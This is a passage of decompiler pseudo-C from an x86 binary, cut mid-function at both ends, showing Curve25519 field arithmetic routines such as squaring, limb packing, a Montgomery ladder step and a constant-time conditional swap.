  *(_QWORD *)(a1 + 40) = 2 * (a2[8] * (__int64)a2[2] + v16 * (__int64)v4 + a2[6] * (__int64)a2[4]);
  v17 = a2[12];
  *(_QWORD *)(a1 + 48) = 2
                       * (a2[8] * (__int64)a2[4]
                        + v17 * (__int64)v4
                        + a2[6] * (__int64)a2[6]
                        + 2 * a2[10] * (__int64)a2[2]);
  v18 = a2[14];
  *(_QWORD *)(a1 + 56) = 2
                       * (a2[10] * (__int64)a2[4] + a2[12] * (__int64)a2[2] + v18 * (__int64)v4 + a2[8] * (__int64)a2[6]);
  v13 = a2[16];
  v9 = a2[8] * (__int64)a2[8]
     + 2 * (a2[12] * (__int64)a2[4] + v13 * (__int64)v4 + 2 * (a2[14] * (__int64)a2[2] + a2[10] * (__int64)a2[6]));
  v10 = a2[18];
  *(_QWORD *)(a1 + 64) = v9;
  *(_QWORD *)(a1 + 72) = 2
                       * (v16 * (__int64)v15
                        + v18 * (__int64)v8
                        + v13 * (__int64)v12
                        + v10 * (__int64)v4
                        + v17 * (__int64)v14);
  *(_QWORD *)(a1 + 80) = 2
                       * (v16 * (__int64)v16
                        + v17 * (__int64)v15
                        + v13 * (__int64)v8
                        + 2 * (v10 * (__int64)v12 + v18 * (__int64)v14));
  *(_QWORD *)(a1 + 88) = 2 * (v17 * (__int64)v16 + v18 * (__int64)v15 + v10 * (__int64)v8 + v13 * (__int64)v14);
  *(_QWORD *)(a1 + 96) = v17 * (__int64)v17 + 2 * (v13 * (__int64)v15 + 2 * (v18 * (__int64)v16 + v10 * (__int64)v14));
  *(_QWORD *)(a1 + 104) = 2 * (v18 * (__int64)v17 + v13 * (__int64)v16 + v10 * (__int64)v15);
  *(_QWORD *)(a1 + 112) = 2 * (v18 * (__int64)v18 + v13 * (__int64)v17 + 2 * v10 * (__int64)v16);
  *(_QWORD *)(a1 + 120) = 2 * (v13 * (__int64)v18 + v10 * (__int64)v17);
  *(_QWORD *)(a1 + 128) = v13 * (__int64)v13 + 4 * v10 * (__int64)v18;
  *(_QWORD *)(a1 + 136) = 2 * v10 * (__int64)v13;
  result = 2 * v10 * (__int64)v10;
  *(_QWORD *)(a1 + 144) = result;
  return result;
}

//----- (00405F50) --------------------------------------------------------
int *__fastcall sub_405F50(int *a1, unsigned __int8 *a2)
{
  unsigned __int8 v2; // bl
  int v3; // edi
  unsigned __int64 v4; // rax
  unsigned __int8 *v5; // edi
  unsigned __int8 v6; // bh
  unsigned __int64 v7; // rt0
  unsigned __int8 v8; // bl
  int v9; // esi
  unsigned __int8 v10; // bl
  unsigned __int8 v11; // bh
  int v12; // esi
  int v13; // esi
  int v14; // ecx
  unsigned __int8 v15; // bl
  unsigned int v16; // esi
  int v17; // ecx
  int *result; // eax

  v2 = a2[3];
  v3 = (*a2 | ((a2[2] | (v2 << 8)) << 16)) & 0x3FFFFFF;
  v4 = a2[1];
  a1[1] = v4 >> 24;
  *a1 = ((_DWORD)v4 << 8) | v3;
  v5 = a2;
  v6 = a2[6];
  HIDWORD(v7) = (unsigned __int64)(v6 & 7) >> 24;
  LODWORD(v7) = a2[5] | ((v6 & 7) << 8);
  HIDWORD(v7) = v7 >> 24;
  LODWORD(v7) = a2[4] | ((_DWORD)v7 << 8);
  a1[2] = (v2 >> 2) | ((_DWORD)v7 << 6);
  a1[3] = v7 >> 26;
  HIDWORD(v7) = (unsigned __int64)(a2[9] & 0x1F) >> 24;
  LODWORD(v7) = v5[8] | ((v5[9] & 0x1F) << 8);
  v8 = a2[12];
  HIDWORD(v7) = v7 >> 24;
  LODWORD(v7) = a2[7] | ((_DWORD)v7 << 8);
  a1[4] = (v6 >> 3) | (32 * v7);
  a1[5] = v7 >> 27;
  v9 = (((((unsigned __int64)(v8 & 0x3F) << 8) | v5[11]) << 8) | v5[10]) >> 29;
  a1[6] = (a2[9] >> 5) | (8 * (a2[10] | ((a2[11] | ((v8 & 0x3F) << 8)) << 8)));
  a1[7] = v9;
  HIDWORD(v7) = (unsigned __int64)a2[15] >> 24;
  LODWORD(v7) = *((unsigned __int16 *)a2 + 7);
  LODWORD(v4) = v8 >> 6;
  v10 = a2[19];
  HIDWORD(v7) = v7 >> 24;
  LODWORD(v7) = v5[13] | (*((unsigned __int16 *)v5 + 7) << 8);
  a1[9] = v7 >> 30;
  a1[8] = v4 | (4 * v7);
  v11 = a2[22];
  v12 = (v5[17] << 8) | (v5[16] | ((v5[18] | (v10 << 8)) << 16)) & 0x1FFFFFF;
  a1[11] = (unsigned __int64)a2[17] >> 24;
  a1[10] = v12;
  v13 = (((((unsigned __int64)(v11 & 7) << 8) | v5[21]) << 8) | v5[20]) >> 25;
  v14 = (v10 >> 1) | ((v5[20] | ((v5[21] | ((v11 & 7) << 8)) << 8)) << 7);
  v15 = a2[28];
  a1[12] = v14;
  a1[13] = v13;
  HIDWORD(v7) = (unsigned __int64)(a2[25] & 0xF) >> 24;
  LODWORD(v7) = v5[24] | ((v5[25] & 0xF) << 8);
  HIDWORD(v7) = v7 >> 24;
  LODWORD(v7) = a2[23] | ((_DWORD)v7 << 8);
  a1[14] = (v11 >> 3) | (32 * v7);
  a1[15] = v7 >> 27;
  v16 = (((unsigned __int64)(v15 & 0x3F) << 8) | a2[27]) >> 24;
  v17 = v5[26] | ((v5[27] | ((v15 & 0x3F) << 8)) << 8);
  a1[16] = (a2[25] >> 4) | (16 * v17);
  a1[17] = __PAIR64__(v16, v17) >> 28;
  HIDWORD(v7) = (unsigned __int64)(a2[31] & 0x7F) >> 24;
  LODWORD(v7) = v5[30] | ((v5[31] & 0x7F) << 8);
  HIDWORD(v7) = v7 >> 24;
  LODWORD(v7) = a2[29] | ((_DWORD)v7 << 8);
  result = a1;
  a1[19] = v7 >> 30;
  a1[18] = (v15 >> 6) | (4 * v7);
  return result;
}

//----- (00406250) --------------------------------------------------------
int __fastcall sub_406250(int a1, int *a2)
{
  int v2; // eax
  int v3; // ebx
  int v4; // esi
  int v5; // ecx
  int v6; // edx
  int v7; // edx
  int v8; // edx
  int v9; // edx
  int v10; // edx
  int v11; // ecx
  int v12; // edi
  int v13; // ebx
  int v14; // edx
  int v15; // edx
  int v16; // eax
  int v17; // edx
  int v18; // esi
  int v19; // ecx
  int v20; // edi
  int v21; // edi
  int v22; // edi
  int v23; // esi
  int v24; // edi
  int v25; // edi
  int v26; // ebx
  int v27; // ecx
  int v28; // edx
  int v29; // edx
  int v30; // edx
  int v31; // edx
  int v32; // edx
  int v33; // edx
  int v34; // edx
  int v35; // edi
  int v36; // edx
  int v37; // esi
  int v38; // edx
  int v39; // ebx
  int v40; // eax
  int v41; // ecx
  int v42; // edx
  int v43; // ebx
  int v44; // edx
  int result; // eax
  int v47; // [esp+10h] [ebp-3Ch]
  int v48; // [esp+14h] [ebp-38h]
  int v49; // [esp+18h] [ebp-34h]
  int v50; // [esp+1Ch] [ebp-30h]
  int v51; // [esp+20h] [ebp-2Ch]
  int v52; // [esp+24h] [ebp-28h]
  int v53; // [esp+28h] [ebp-24h]
  int v54; // [esp+28h] [ebp-24h]
  int v55; // [esp+28h] [ebp-24h]
  int v56; // [esp+2Ch] [ebp-20h]
  int v57; // [esp+2Ch] [ebp-20h]
  int v58; // [esp+30h] [ebp-1Ch]
  int v59; // [esp+30h] [ebp-1Ch]
  int v60; // [esp+34h] [ebp-18h]
  int v61; // [esp+34h] [ebp-18h]
  int v62; // [esp+34h] [ebp-18h]
  int v63; // [esp+38h] [ebp-14h]
  int v64; // [esp+38h] [ebp-14h]
  int v65; // [esp+38h] [ebp-14h]
  int v66; // [esp+3Ch] [ebp-10h]
  int v67; // [esp+3Ch] [ebp-10h]
  int v68; // [esp+3Ch] [ebp-10h]
  int v69; // [esp+40h] [ebp-Ch]
  int v70; // [esp+40h] [ebp-Ch]
  int v71; // [esp+40h] [ebp-Ch]
  int v72; // [esp+44h] [ebp-8h]
  int v73; // [esp+44h] [ebp-8h]
  int v74; // [esp+44h] [ebp-8h]
  int v75; // [esp+44h] [ebp-8h]
  int v76; // [esp+48h] [ebp-4h]
  int v77; // [esp+48h] [ebp-4h]
  int v78; // [esp+48h] [ebp-4h]

  v2 = *a2;
  v3 = a2[18];
  v66 = a2[10];
  v56 = a2[2];
  v63 = a2[12];
  v76 = a2[4];
  v60 = a2[14];
  v72 = a2[6];
  v69 = a2[8];
  v58 = a2[16];
  v53 = 2;
  do
  {
    v4 = (v2 >> 26) & (v2 >> 31);
    v5 = (((v4 + v56) >> 25) & ((v4 + v56) >> 31)) + v76;
    v56 = v4 + v56 - ((((v4 + v56) >> 25) & ((v4 + v56) >> 31)) << 25);
    v76 = v5 - (((v5 >> 26) & (v5 >> 31)) << 26);
    v73 = ((v5 >> 26) & (v5 >> 31)) + v72;
    v6 = (v73 >> 25) & (v73 >> 31);
    v72 = v73 - (v6 << 25);
    v70 = v6 + v69;
    v7 = (v70 >> 26) & (v70 >> 31);
    v69 = v70 - (v7 << 26);
    v67 = v7 + v66;
    v8 = (v67 >> 25) & (v67 >> 31);
    v66 = v67 - (v8 << 25);
    v64 = v8 + v63;
    v9 = (v64 >> 26) & (v64 >> 31);
    v63 = v64 - (v9 << 26);
    v61 = v9 + v60;
    v10 = (v61 >> 25) & (v61 >> 31);
    v60 = v61 - (v10 << 25);
    v11 = v10 + v58;
    v12 = v72;
    v13 = ((v11 >> 26) & (v11 >> 31)) + v3;
    v58 = v11 - (((v11 >> 26) & (v11 >> 31)) << 26);
    v14 = (v13 >> 25) & (v13 >> 31);
    v3 = v13 - (v14 << 25);
    v2 += 19 * v14 - (v4 << 26);
    --v53;
  }
  while ( v53 );
  v54 = 2;
  v15 = (v2 >> 26) & (v2 >> 31);
  v57 = v15 + v56;
  v16 = v2 - (v15 << 26);
  v17 = v76;
  do
  {
    v18 = v57 + (v16 >> 26);
    v19 = v17 + (v18 >> 25);
    v57 = v18 & 0x1FFFFFF;
    v17 = v19 & 0x3FFFFFF;
    v20 = v12 + (v19 >> 26);
    v74 = v20 & 0x1FFFFFF;
    v21 = v69 + (v20 >> 25);
    v69 = v21 & 0x3FFFFFF;
    v22 = v66 + (v21 >> 26);
    v66 = v22 & 0x1FFFFFF;
    v23 = (v63 + (v22 >> 25)) & 0x3FFFFFF;
    v24 = v60 + ((v63 + (v22 >> 25)) >> 26);
    v63 = v23;
    v60 = v24 & 0x1FFFFFF;
    v25 = v58 + (v24 >> 25);
    v26 = (v25 >> 26) + v3;
    v58 = v25 & 0x3FFFFFF;
    v12 = v74;
    v27 = v26 >> 25;
    v3 = v26 & 0x1FFFFFF;
    v16 = 19 * v27 + (v16 & 0x3FFFFFF);
    --v54;
  }
  while ( v54 );
  v77 = v17;
  v48 = v3;
  v28 = (16
       * ((((~(v57 ^ 0x1FFFFFF) << 16) & ~(v57 ^ 0x1FFFFFF)) << 8) & (~(v57 ^ 0x1FFFFFF) << 16) & ~(v57 ^ 0x1FFFFFF))) & (((~(v57 ^ 0x1FFFFFF) << 16) & ~(v57 ^ 0x1FFFFFF)) << 8) & (~(v57 ^ 0x1FFFFFF) << 16) & ~(v57 ^ 0x1FFFFFF);
  v55 = v28 & (4 * v28);
  v29 = (16
       * ((((~(v77 ^ 0x3FFFFFF) << 16) & ~(v77 ^ 0x3FFFFFF)) << 8) & (~(v77 ^ 0x3FFFFFF) << 16) & ~(v77 ^ 0x3FFFFFF))) & (((~(v77 ^ 0x3FFFFFF) << 16) & ~(v77 ^ 0x3FFFFFF)) << 8) & (~(v77 ^ 0x3FFFFFF) << 16) & ~(v77 ^ 0x3FFFFFF);
  v52 = v29 & (4 * v29);
  v30 = (16
       * ((((~(v74 ^ 0x1FFFFFF) << 16) & ~(v74 ^ 0x1FFFFFF)) << 8) & (~(v74 ^ 0x1FFFFFF) << 16) & ~(v74 ^ 0x1FFFFFF))) & (((~(v74 ^ 0x1FFFFFF) << 16) & ~(v74 ^ 0x1FFFFFF)) << 8) & (~(v74 ^ 0x1FFFFFF) << 16) & ~(v74 ^ 0x1FFFFFF);
  v47 = v30 & (4 * v30);
  v31 = (16
       * ((((~(v69 ^ 0x3FFFFFF) << 16) & ~(v69 ^ 0x3FFFFFF)) << 8) & (~(v69 ^ 0x3FFFFFF) << 16) & ~(v69 ^ 0x3FFFFFF))) & (((~(v69 ^ 0x3FFFFFF) << 16) & ~(v69 ^ 0x3FFFFFF)) << 8) & (~(v69 ^ 0x3FFFFFF) << 16) & ~(v69 ^ 0x3FFFFFF);
  v51 = v31 & (4 * v31);
  v32 = (16
       * ((((~(v66 ^ 0x1FFFFFF) << 16) & ~(v66 ^ 0x1FFFFFF)) << 8) & (~(v66 ^ 0x1FFFFFF) << 16) & ~(v66 ^ 0x1FFFFFF))) & (((~(v66 ^ 0x1FFFFFF) << 16) & ~(v66 ^ 0x1FFFFFF)) << 8) & (~(v66 ^ 0x1FFFFFF) << 16) & ~(v66 ^ 0x1FFFFFF);
  v50 = v32 & (4 * v32);
  v33 = (16
       * ((((~(v23 ^ 0x3FFFFFF) << 16) & ~(v23 ^ 0x3FFFFFF)) << 8) & (~(v23 ^ 0x3FFFFFF) << 16) & ~(v23 ^ 0x3FFFFFF))) & (((~(v23 ^ 0x3FFFFFF) << 16) & ~(v23 ^ 0x3FFFFFF)) << 8) & (~(v23 ^ 0x3FFFFFF) << 16) & ~(v23 ^ 0x3FFFFFF);
  v49 = v33 & (4 * v33);
  v34 = (16
       * ((((~(v60 ^ 0x1FFFFFF) << 16) & ~(v60 ^ 0x1FFFFFF)) << 8) & (~(v60 ^ 0x1FFFFFF) << 16) & ~(v60 ^ 0x1FFFFFF))) & (((~(v60 ^ 0x1FFFFFF) << 16) & ~(v60 ^ 0x1FFFFFF)) << 8) & (~(v60 ^ 0x1FFFFFF) << 16) & ~(v60 ^ 0x1FFFFFF);
  v35 = v34 & (4 * v34);
  v36 = (16
       * ((((~(v58 ^ 0x3FFFFFF) << 16) & ~(v58 ^ 0x3FFFFFF)) << 8) & (~(v58 ^ 0x3FFFFFF) << 16) & ~(v58 ^ 0x3FFFFFF))) & (((~(v58 ^ 0x3FFFFFF) << 16) & ~(v58 ^ 0x3FFFFFF)) << 8) & (~(v58 ^ 0x3FFFFFF) << 16) & ~(v58 ^ 0x3FFFFFF);
  v37 = v36 & (4 * v36);
  v38 = (16
       * ((((~(v48 ^ 0x1FFFFFF) << 16) & ~(v48 ^ 0x1FFFFFF)) << 8) & (~(v48 ^ 0x1FFFFFF) << 16) & ~(v48 ^ 0x1FFFFFF))) & (((~(v48 ^ 0x1FFFFFF) << 16) & ~(v48 ^ 0x1FFFFFF)) << 8) & (~(v48 ^ 0x1FFFFFF) << 16) & ~(v48 ^ 0x1FFFFFF);
  v39 = (((4 * v38) & v38) >> 31) & (v37 >> 31) & (v35 >> 31) & (v49 >> 31) & (v50 >> 31) & (v51 >> 31) & (v52 >> 31) & (v55 >> 31) & (v47 >> 31) & ~((v16 - 67108845) >> 31) & ((2 * ((4 * v38) & v38 & v37 & v35 & v49 & v50 & v51 & v52 & v55 & v47)) >> 31);
  v40 = v16 - (v39 & 0x3FFFFED);
  v41 = v39 & 0x1FFFFFF;
  v39 &= 0x3FFFFFFu;
  v68 = v66 - v41;
  v78 = 8 * (v77 - v39);
  v75 = 32 * (v74 - v41);
  v71 = (v69 - v39) << 6;
  *(_BYTE *)a1 = v40;
  v65 = 2 * (v63 - v39);
  v62 = 8 * (v60 - v41);
  v42 = v58 - v39;
  v43 = 4 * (v57 - v41);
  v59 = 16 * v42;
  *(_BYTE *)(a1 + 1) = BYTE1(v40);
  *(_BYTE *)(a1 + 3) = v43 | HIBYTE(v40);
  *(_BYTE *)(a1 + 4) = BYTE1(v43);
  *(_BYTE *)(a1 + 5) = BYTE2(v43);
  *(_BYTE *)(a1 + 2) = BYTE2(v40);
  *(_BYTE *)(a1 + 7) = BYTE1(v78);
  *(_BYTE *)(a1 + 6) = v78 | HIBYTE(v43);
  v44 = (v48 - v41) << 6;
  *(_BYTE *)(a1 + 8) = BYTE2(v78);
  *(_BYTE *)(a1 + 9) = v75 | HIBYTE(v78);
  *(_WORD *)(a1 + 10) = *(_WORD *)((char *)&v75 + 1);
  *(_WORD *)(a1 + 13) = *(_WORD *)((char *)&v71 + 1);
  *(_BYTE *)(a1 + 12) = v71 | HIBYTE(v75);
  *(_WORD *)(a1 + 17) = *(_WORD *)((char *)&v68 + 1);
  *(_BYTE *)(a1 + 15) = HIBYTE(v71);
  *(_BYTE *)(a1 + 20) = BYTE1(v65);
  *(_BYTE *)(a1 + 16) = v68;
  *(_BYTE *)(a1 + 21) = BYTE2(v65);
  *(_BYTE *)(a1 + 19) = v65 | HIBYTE(v68);
  *(_BYTE *)(a1 + 22) = v62 | HIBYTE(v65);
  *(_WORD *)(a1 + 23) = *(_WORD *)((char *)&v62 + 1);
  *(_WORD *)(a1 + 26) = *(_WORD *)((char *)&v59 + 1);
  *(_BYTE *)(a1 + 29) = BYTE1(v44);
  result = (__int16)((v48 - v41) >> 10);
  *(_BYTE *)(a1 + 25) = v59 | HIBYTE(v62);
  *(_BYTE *)(a1 + 28) = v44 | HIBYTE(v59);
  *(_BYTE *)(a1 + 30) = BYTE2(v44);
  *(_BYTE *)(a1 + 31) = HIBYTE(v44);
  return result;
}

//----- (004067E0) --------------------------------------------------------
int __usercall sub_4067E0@<eax>(
        _QWORD *a1@<edx>,
        _QWORD *a2@<ecx>,
        __m128i *a3,
        int a4,
        int a5,
        __m128i *a6,
        int a7,
        __m128i *a8,
        int *a9)
{
  __m128i v9; // xmm1
  __m128i v10; // xmm2
  unsigned int v11; // edx
  _DWORD *v12; // eax
  __m128i v13; // xmm3
  __m128i v14; // xmm4
  __int8 *v15; // esi
  __int128 v16; // xmm0
  __int32 v17; // ecx
  bool v18; // cf
  int v19; // ecx
  int v20; // edi
  __m128i *v21; // edx
  __int64 v22; // kr00_8
  unsigned int v23; // edx
  __int8 *v24; // esi
  __m128i v25; // xmm1
  _DWORD *v26; // ecx
  __m128i v27; // xmm2
  __m128i v28; // xmm3
  __m128i v29; // xmm4
  __int128 v30; // xmm0
  __int32 v31; // eax
  int v32; // eax
  int v33; // ebx
  __m128i *v34; // esi
  __int64 v35; // kr08_8
  __m128i v36; // xmm1
  unsigned int v37; // ecx
  __m128i v38; // xmm2
  __m128i v39; // xmm3
  __m128i v40; // xmm4
  __int32 v41; // eax
  __int32 v42; // eax
  unsigned int v43; // edx
  unsigned __int64 v44; // kr10_8
  _QWORD *v45; // ebx
  unsigned int v46; // edx
  unsigned __int64 v47; // kr18_8
  unsigned int i; // ecx
  __int32 v49; // eax
  __int32 v50; // eax
  _QWORD *v51; // ebx
  __int128 v53[9]; // [esp+Ch] [ebp-4CCh] BYREF
  __m128i v54; // [esp+A4h] [ebp-434h] BYREF
  __m128i v55; // [esp+B4h] [ebp-424h]
  __m128i v56; // [esp+C4h] [ebp-414h]
  __m128i v57; // [esp+D4h] [ebp-404h]
  __m128i v58; // [esp+E4h] [ebp-3F4h]
  __m128i v59; // [esp+13Ch] [ebp-39Ch] BYREF
  __m128i v60; // [esp+14Ch] [ebp-38Ch]
  __m128i v61; // [esp+15Ch] [ebp-37Ch]
  __m128i v62; // [esp+16Ch] [ebp-36Ch]
  __int128 v63; // [esp+17Ch] [ebp-35Ch]
  __m128i v64; // [esp+1D4h] [ebp-304h] BYREF
  __m128i v65; // [esp+1E4h] [ebp-2F4h]
  __m128i v66; // [esp+1F4h] [ebp-2E4h]
  __m128i v67; // [esp+204h] [ebp-2D4h]
  __m128i v68; // [esp+214h] [ebp-2C4h]
  __int128 v69[4]; // [esp+26Ch] [ebp-26Ch] BYREF
  _BYTE v70[24]; // [esp+2ACh] [ebp-22Ch] BYREF
  __m128i v71; // [esp+2C4h] [ebp-214h]
  __m128i v72; // [esp+2D4h] [ebp-204h]
  __m128i v73; // [esp+2E4h] [ebp-1F4h]
  __int128 v74; // [esp+2F4h] [ebp-1E4h]
  __m128i v75; // [esp+304h] [ebp-1D4h] BYREF
  __m128i v76; // [esp+314h] [ebp-1C4h]
  __m128i v77; // [esp+324h] [ebp-1B4h]
  __m128i v78; // [esp+334h] [ebp-1A4h]
  __int128 v79; // [esp+344h] [ebp-194h]
  __int64 v80; // [esp+39Ch] [ebp-13Ch] BYREF
  __int64 v81[18]; // [esp+3A4h] [ebp-134h] BYREF
  __m128i v82; // [esp+434h] [ebp-A4h] BYREF
  __m128i v83; // [esp+444h] [ebp-94h]
  __m128i v84; // [esp+454h] [ebp-84h]
  __m128i v85; // [esp+464h] [ebp-74h]
  __m128i v86; // [esp+474h] [ebp-64h]
  _QWORD *v87; // [esp+4CCh] [ebp-Ch]
  _QWORD *v88; // [esp+4D0h] [ebp-8h]

  v88 = a2;
  v9 = *(__m128i *)a5;
  v87 = a1;
  v10 = *(__m128i *)(a5 + 16);
  v11 = 0;
  v12 = (_DWORD *)(a5 + 8);
  v13 = *(__m128i *)(a5 + 32);
  v14 = *(__m128i *)(a5 + 48);
  v15 = &a6->m128i_i8[-a5];
  v16 = *(_OWORD *)(a5 + 64);
  *(__m128i *)&v70[8] = v9;
  v71 = v10;
  v72 = v13;
  v73 = v14;
  v74 = v16;
  do
  {
    v17 = a6[v11].m128i_i32[0];
    v18 = __CFADD__(v17, *(v12 - 2));
    *(v12 - 2) += v17;
    *(v12 - 1) += a6[v11].m128i_i32[1] + v18;
    v19 = *(_DWORD *)((char *)v12 + (_DWORD)v15);
    v18 = __CFADD__(v19, *v12);
    *v12 += v19;
    v12[1] += *(_DWORD *)((char *)v12 + (_DWORD)v15 + 4) + v18;
    ++v11;
    v12 += 4;
  }
  while ( v11 < 5 );
  v20 = 2;
  v21 = a6 + 4;
  *a6 = _mm_sub_epi64(v9, *a6);
  a6[1] = _mm_sub_epi64(v10, a6[1]);
  a6[2] = _mm_sub_epi64(v13, a6[2]);
  a6[3] = _mm_sub_epi64(v14, a6[3]);
  do
  {
    v22 = *(__int64 *)((char *)v21->m128i_i64 + &v70[8] - (_BYTE *)a6) - v21->m128i_i64[0];
    v21 = (__m128i *)((char *)v21 + 8);
    v21[-1].m128i_i64[1] = v22;
    --v20;
  }
  while ( v20 );
  v23 = 0;
  v24 = &a8->m128i_i8[-a7];
  v25 = *(__m128i *)a7;
  v26 = (_DWORD *)(a7 + 8);
  v27 = *(__m128i *)(a7 + 16);
  v28 = *(__m128i *)(a7 + 32);
  v29 = *(__m128i *)(a7 + 48);
  v30 = *(_OWORD *)(a7 + 64);
  *(_OWORD *)&v70[8] = *(_OWORD *)a7;
  v71 = v27;
  v72 = v28;
  v73 = v29;
  v74 = v30;
  do
  {
    v31 = a8[v23].m128i_i32[0];
    v18 = __CFADD__(v31, *(v26 - 2));
    *(v26 - 2) += v31;
    *(v26 - 1) += a8[v23].m128i_i32[1] + v18;
    v32 = *(_DWORD *)((char *)v26 + (_DWORD)v24);
    v18 = __CFADD__(v32, *v26);
    *v26 += v32;
    v26[1] += *(_DWORD *)((char *)v26 + (_DWORD)v24 + 4) + v18;
    ++v23;
    v26 += 4;
  }
  while ( v23 < 5 );
  v33 = 2;
  v34 = a8 + 4;
  *a8 = _mm_sub_epi64(v25, *a8);
  a8[1] = _mm_sub_epi64(v27, a8[1]);
  a8[2] = _mm_sub_epi64(v28, a8[2]);
  a8[3] = _mm_sub_epi64(v29, a8[3]);
  do
  {
    v35 = *(__int64 *)((char *)v34->m128i_i64 + &v70[8] - (_BYTE *)a8) - v34->m128i_i64[0];
    v34 = (__m128i *)((char *)v34 + 8);
    v34[-1].m128i_i64[1] = v35;
    --v33;
  }
  while ( v33 );
  sub_405510((int *)a7, &v59, a6->m128i_i32);
  sub_405510((int *)a5, &v75, a8->m128i_i32);
  sub_4059E0(&v59);
  sub_405AC0(&v59);
  sub_4059E0(&v75);
  sub_405AC0(&v75);
  v36 = v59;
  v37 = 0;
  v38 = v60;
  v39 = v61;
  v40 = v62;
  *(__m128i *)&v70[8] = v59;
  v71 = v60;
  v72 = v61;
  v73 = v62;
  v74 = v63;
  do
  {
    v41 = v75.m128i_i32[v37];
    v18 = __CFADD__(v41, v59.m128i_i32[v37]);
    v59.m128i_i32[v37] += v41;
    v59.m128i_i32[v37 + 1] += v75.m128i_i32[v37 + 1] + v18;
    v42 = v75.m128i_i32[v37 + 2];
    v18 = __CFADD__(v42, v59.m128i_i32[v37 + 2]);
    v59.m128i_i32[v37 + 2] += v42;
    v59.m128i_i32[v37 + 3] += v75.m128i_i32[v37 + 3] + v18;
    v37 += 4;
  }
  while ( v37 < 20 );
  v43 = 16;
  v75 = _mm_sub_epi64(v36, v75);
  v76 = _mm_sub_epi64(v38, v76);
  v77 = _mm_sub_epi64(v39, v77);
  v78 = _mm_sub_epi64(v40, v78);
  do
  {
    v44 = __PAIR64__(*(_DWORD *)&v70[v43 * 4 + 12], *(_DWORD *)&v70[v43 * 4 + 8])
        - __PAIR64__(v75.m128i_i32[v43 + 1], v75.m128i_i32[v43]);
    v75.m128i_i32[v43] = *(_DWORD *)&v70[v43 * 4 + 8] - v75.m128i_i32[v43];
    v75.m128i_i32[v43 + 1] = HIDWORD(v44);
    v43 += 2;
  }
  while ( v43 < 20 );
  sub_405BD0((int)&v64, v59.m128i_i32);
  sub_4059E0(&v64);
  sub_405AC0(&v64);
  sub_405BD0((int)v69, v75.m128i_i32);
  sub_4059E0(v69);
  sub_405AC0(v69);
  v53[0] = v69[0];
  v53[1] = v69[1];
  v53[2] = v69[2];
  v53[3] = v69[3];
  v53[4] = *(_OWORD *)v70;
  sub_405510((int *)v53, &v75, a9);
  sub_4059E0(&v75);
  sub_405AC0(&v75);
  *a3 = v64;
  a3[1] = v65;
  a3[2] = v66;
  a3[3] = v67;
  a3[4] = v68;
  *(__m128i *)a4 = v75;
  *(__m128i *)(a4 + 16) = v76;
  *(__m128i *)(a4 + 32) = v77;
  *(__m128i *)(a4 + 48) = v78;
  *(_OWORD *)(a4 + 64) = v79;
  sub_405BD0((int)&v64, (int *)a5);
  sub_4059E0(&v64);
  sub_405AC0(&v64);
  v54 = v64;
  v55 = v65;
  v56 = v66;
  v57 = v67;
  v58 = v68;
  sub_405BD0((int)&v64, a6->m128i_i32);
  sub_4059E0(&v64);
  sub_405AC0(&v64);
  v82 = v64;
  v45 = v88;
  v83 = v65;
  v84 = v66;
  v85 = v67;
  v86 = v68;
  sub_405510(v54.m128i_i32, v88, v82.m128i_i32);
  sub_4059E0(v45);
  sub_405AC0(v45);
  v46 = 16;
  v82 = _mm_sub_epi64(v54, v82);
  v83 = _mm_sub_epi64(v55, v83);
  v84 = _mm_sub_epi64(v56, v84);
  v85 = _mm_sub_epi64(v57, v85);
  do
  {
    v47 = __PAIR64__(v54.m128i_i32[v46 + 1], v54.m128i_i32[v46])
        - __PAIR64__(v82.m128i_i32[v46 + 1], v82.m128i_i32[v46]);
    v82.m128i_i32[v46] = v54.m128i_i32[v46] - v82.m128i_i32[v46];
    v82.m128i_i32[v46 + 1] = HIDWORD(v47);
    v46 += 2;
  }
  while ( v46 < 20 );
  memset(&v81[9], 0, 0x48u);
  v80 = 121665 * v82.m128i_i64[0];
  v81[0] = 121665 * v82.m128i_i64[1];
  v81[1] = 121665 * v83.m128i_i64[0];
  v81[2] = 121665 * v83.m128i_i64[1];
  v81[3] = 121665 * v84.m128i_i64[0];
  v81[4] = 121665 * v84.m128i_i64[1];
  v81[5] = 121665 * v85.m128i_i64[0];
  v81[6] = 121665 * v85.m128i_i64[1];
  v81[7] = 121665 * v86.m128i_i64[0];
  v81[8] = 121665 * v86.m128i_i64[1];
  sub_405AC0(&v80);
  for ( i = 0; i < 0x50; i += 16 )
  {
    v49 = v54.m128i_i32[i / 4];
    v18 = __CFADD__(v49, v81[i / 8 - 1]);
    LODWORD(v81[i / 8 - 1]) += v49;
    *(_DWORD *)((char *)&v80 + i + 4) += v54.m128i_i32[i / 4 + 1] + v18;
    v50 = v54.m128i_i32[i / 4 + 2];
    v18 = __CFADD__(v50, v81[i / 8]);
    LODWORD(v81[i / 8]) += v50;
    HIDWORD(v81[i / 8]) += v54.m128i_i32[i / 4 + 3] + v18;
  }
  v51 = v87;
  sub_405510(v82.m128i_i32, v87, (int *)&v80);
  sub_4059E0(v51);
  return sub_405AC0(v51);
}
// 4067E0: using guessed type __m128i var_64;

//----- (00406F80) --------------------------------------------------------
__int64 __usercall sub_406F80@<edx:eax>(_DWORD *a1@<edx>, _DWORD *a2@<ecx>, int a3)
{
  int v4; // esi
  int v5; // ecx
  int v6; // eax
  int v7; // ecx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // ecx
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // eax
  int v21; // ecx
  int v22; // eax
  int v23; // ecx
  int v24; // eax
  int v25; // ecx
  int v26; // eax
  int v27; // ecx
  int v28; // eax
  int v29; // ecx
  int v30; // eax
  int v31; // ecx
  int v32; // eax
  int v33; // ecx
  int v34; // eax
  int v35; // ecx
  int v36; // eax
  int v37; // ecx
  int v38; // eax
  int v39; // ecx
  __int64 result; // rax

  v4 = -a3 & (*a2 ^ *a1);
  *(_QWORD *)a2 = v4 ^ *a2;
  v5 = a1[2];
  *(_QWORD *)a1 = v4 ^ *a1;
  v6 = a2[2];
  v7 = -a3 & (v6 ^ v5);
  *((_QWORD *)a2 + 1) = v7 ^ v6;
  v8 = v7 ^ a1[2];
  v9 = a1[4];
  *((_QWORD *)a1 + 1) = v8;
  v10 = a2[4];
  v11 = -a3 & (v10 ^ v9);
  *((_QWORD *)a2 + 2) = v11 ^ v10;
  v12 = v11 ^ a1[4];
  v13 = a1[6];
  *((_QWORD *)a1 + 2) = v12;
  v14 = a2[6];
